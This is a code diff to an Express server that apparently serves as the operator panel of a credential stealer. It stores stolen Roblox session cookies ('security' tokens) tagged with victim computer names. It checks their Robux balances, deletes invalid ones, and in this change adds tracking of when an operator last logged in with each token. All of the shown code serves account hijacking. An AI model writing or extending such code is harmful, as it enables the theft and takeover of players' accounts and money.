@@ -819,7 +819,7 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
     const roblox = doc.roblox || {};
     try {
       const info = await fetchRobuxInfo(roblox.security);
-      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, ...info });
+      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, lastLogin: roblox.lastLogin, ...info });
       if (!info.valid) {
         await removeInvalidToken(db, user, doc.name);
         console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
@@ -967,7 +967,7 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
         results.push({
           file: doc.name, originalName: doc.originalName,
           computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
-          user: roblox.user, security: roblox.security, ...info
+          user: roblox.user, security: roblox.security, lastLogin: roblox.lastLogin, ...info
         });
         if (!info.valid) {
           await removeInvalidToken(db, user, doc.name);
@@ -1000,7 +1000,31 @@ app.get('/tokens', requireAuth, (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  AI ANALYSIS (расширенный)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-app.post('/analyze', requireAuth, async (req, res) => {
+  app.post('/api/login-mark', requireAuth, async (req, res) => {
+    try {
+      const { filename } = req.body;
+      if (!filename) return res.status(400).json({ error: 'No file' });
+      const user = req.authUser || req.session.user;
+      const db = await getDb();
+      const now = Date.now();
+      if (db) {
+        await db.collection('files').updateOne(
+          { name: filename, operator: user },
+          { $set: { 'roblox.lastLogin': now } }
+        );
+      } else {
+        const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+        if (doc && doc.roblox) {
+          doc.roblox.lastLogin = now;
+        }
+      }
+      res.json({ success: true, timestamp: now });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  });
+
+  app.post('/analyze', requireAuth, async (req, res) => {
   const { filename } = req.body;
   const db = await getDb();
   const user = req.authUser || req.session.user;
